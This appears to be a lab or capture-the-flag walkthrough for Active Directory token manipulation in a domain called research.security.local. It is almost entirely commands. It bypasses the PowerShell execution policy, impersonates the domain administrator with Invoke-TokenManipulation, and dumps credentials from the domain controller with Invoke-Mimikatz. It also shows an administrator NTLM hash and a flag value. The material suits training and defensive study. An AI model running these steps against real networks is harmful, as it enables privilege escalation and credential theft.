# AD - Token Manipulation

##### The C:\Tools folder that contains the necessary tools
```
cd C:\Tools
powershell -ep bypass 
. .\PowerView.ps1
```

##### Find domain-related information.
```
Get-Domain
```

##### Enumerate the available tokens using the Invoke-TokenManipulation.
```
cd C:\Tools
powershell -ep bypass 
. .\Invoke-TokenManipulation.ps1

Invoke-TokenManipulation -Enumerate
```

##### Create a new PowerShell process running as research\administrator.
```
Invoke-TokenManipulation –CreateProcess “c:\windows\system32\windowspowershell\v1.0\powershell.exe” –Username “research\administrator”
```

##### Use mimikatz to get the details of all users logged in to the Domain controller
```
cd C:\Tools
powershell -ep bypass 
. .\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Computername prod.research.security.local 
```

NTLM hash of the Domain administrator: **84398159ce4d01cfe10cf34d5dae3909**


##### Access the Domain Controller and retrieve the flag
```
Enter-PSSession prod.research.SECURITY.local

Get-Content -Path "C:\flag.txt"
```
**FLAG: 5f140e8052d38d6d2a8f887eec284f09**
